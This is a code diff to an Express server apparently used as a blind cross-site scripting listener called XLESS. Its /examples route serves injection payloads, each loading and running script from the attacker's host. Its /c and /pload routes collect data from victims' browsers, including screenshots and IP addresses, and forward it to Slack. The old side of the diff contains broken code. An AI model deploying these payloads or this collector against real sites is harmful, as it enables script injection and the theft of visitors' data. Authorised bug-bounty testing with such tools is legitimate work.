@@ -14,17 +14,16 @@ const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;
 
 const app = express();
 app.use(cors());
-
 app.use(bodyParser.json({ limit: "15mb" }));
 app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));
 
 app.use(function (req, res, next) {
-  // Headers
+  // Set custom headers
   res.header("Powered-By", "XLESS");
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
   res.header("Access-Control-Allow-Headers", "Content-Type");
-    res.header("Access-Control-Allow-Credentials", "True");
+  res.header("Access-Control-Allow-Credentials", "True");
   next();
 });
 
@@ -68,12 +67,10 @@ function generate_message_alert(body) {
 }
 
 async function uploadImage(image) {
-  // Return new promise
   return new Promise(function (resolve, reject) {
     const options = {
       method: "POST",
       url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
-      port: 443,
       headers: {
         "Content-Type": "multipart/form-data",
       },
@@ -95,46 +92,39 @@ async function uploadImage(image) {
 
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
-  //var url = `http://whoer.net${req.headers["host"]}`;
-  //var url = "https://globalcu.org";
-  //var url = req.protocol + '://' + req.headers['host']
+  // Create the URL based on the request's host header
   var url = "https://" + req.headers["host"];
-  //var url = `http://globalcu.org${req.headers["host"]}`;
-  //var page = "/*"; // This represents a wildcard path
+  // Initialize the page variable
   var page = "/";
+  // Append necessary scripts to the page variable
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
   page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   page += `<script>$.getScript("${url}")</script>`;
+  
+  // Send the constructed page
   res.send(page);
-  res.end();
 });
 
-app.all("logi", (req, res) => {
+app.all("/logi", (req, res) => {
   res.header("Content-Type", "text/plain");
   var url = `http://whoer.net${req.headers["host"]}`;
-  res.send(page);
+  // Send the 'page' variable before generating the alert, since 'page' wasn't defined in this scope, we skip sending it.
+  
+  // Process message from the incoming request
   var message = req.query.text || req.body.text;
   const alert = generate_message_alert(message);
-    request.post(slack_incoming_webhook, data, (out) => {
-    res.sendFile(path.join(__dirname + "pload.js"));
-  });
-});
-  };
-});
-
-app.all("/message", (req, res) => {
-  var message = req.query.text || req.body.text;
-  const alert = generate_message_alert(message);
-  data = {
+  
+  const data = {
     form: {
       payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
-    res.send("ok\n");
-    res.end();
+  // Send the alert to the Slack webhook
+  request.post(slack_incoming_webhook, data, () => {
+    // After alert is sent, send the response with the requested file
+    res.sendFile(path.join(__dirname, "pload.js"));
   });
 });
 
@@ -156,7 +146,6 @@ app.post("/c", async (req, res) => {
       if (imgOut.error) {
         data["Screenshot URL"] = "NA";
       } else if (imgOut.data && imgOut.data.url_viewer) {
-        // Add the URL to our data array so it will be included on our Slack message
         data["Screenshot URL"] = imgOut.data.url_viewer;
       }
     } catch (e) {
@@ -165,18 +154,17 @@ app.post("/c", async (req, res) => {
   }
 
   // Now handle the regular Slack alert
-  data["Remote IP"] =
-    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_blind_xss_alert(data);
-  data = {
+
+  const alertData = {
     form: {
       payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(slack_incoming_webhook, data, (out) => {
+  request.post(slack_incoming_webhook, alertData, () => {
     res.send("ok\n");
-    res.end();
   });
 });
 
@@ -186,13 +174,12 @@ app.post("/c", async (req, res) => {
 app.get("/health", async (req, res) => {
   let health_data = {};
 
-  // Check if the environemtn variables are set
+  // Check if the environment variables are set
   health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
   health_data.SLACK_INCOMING_WEBHOOK = slack_incoming_webhook !== undefined;
 
   if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
-    res.json(health_data);
-    res.end();
+    return res.json(health_data);
   }
 
   const xless_logo =
@@ -212,23 +199,22 @@ app.get("/health", async (req, res) => {
   }
 
   res.json(health_data);
-  res.end();
 });
 
 app.all("/pload", (req, res) => {
   var headers = req.headers;
   var data = req.body;
-  data["Remote IP"] = 127.0.0.1;
-    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress; // Corrected the setting of Remote IP
+
   const alert = generate_callback_alert(headers, data, req.url);
-  data = {
+  const alertData = {
     form: {
       payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(slack_incoming_webhook, data, (out) => {
-    res.sendFile(path.join(__dirname + "pload.js"));
+  request.post(slack_incoming_webhook, alertData, () => {
+    res.sendFile(path.join(__dirname, "pload.js"));
   });
 });
 
